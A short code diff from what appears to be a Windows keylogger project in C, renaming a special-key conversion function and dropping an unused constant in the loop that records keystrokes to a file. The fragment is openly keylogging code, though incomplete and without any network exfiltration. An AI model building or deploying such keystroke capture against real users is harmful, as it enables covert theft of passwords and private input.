@@ -5,8 +5,6 @@
 #include "win_keylog.h"
 #include "../writing/file.h"
 
-#define SPECIAL_KEYS_LENGTH 50
-
 // Whenever the keylogger is started, add this to the file first
 void winWriteHeader(const char* filePath) {
     FILE *file;
@@ -47,7 +45,7 @@ void windows_keylog(const char* filePath) {
                 int isSpecialKey = CheckSpecialKey(key);
                 if (isSpecialKey) {
                     // Convert special key into readable key
-                    char *specialKey = SpecialKeyToReadable(key);
+                    char *specialKey = windows_SpecialKeyToReadable(key);
                     if (specialKey != NULL) {
                         WriteSpecialKeyIntoFile(specialKey, filePath);
                     }
